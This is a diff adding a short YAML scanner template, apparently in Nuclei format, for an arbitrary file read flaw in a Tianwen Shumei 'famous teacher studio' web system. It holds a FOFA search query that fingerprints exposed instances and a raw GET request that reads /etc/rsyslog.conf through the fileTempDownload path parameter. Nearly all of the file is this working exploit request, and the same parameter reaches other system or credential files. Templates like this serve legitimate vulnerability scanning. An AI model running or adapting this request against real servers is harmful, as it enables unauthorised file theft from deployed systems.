@@ -1,0 +1,21 @@
+id: poc-lkqxozpgeq6sfl1e
+info:
+  name: 天闻数媒名师工作室系统 fileTempDownload 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lkqxozpgeq6sfl1e'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lkqxozpgeq6sfl1e
+    fofa: body="/static/js/bootstrap/bootstrap.css" && title="名师工作室"
+http:
+- raw:
+  - 'GET /fileUploadAndDownload/fileTempDownload?path=/etc/rsyslog.conf HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
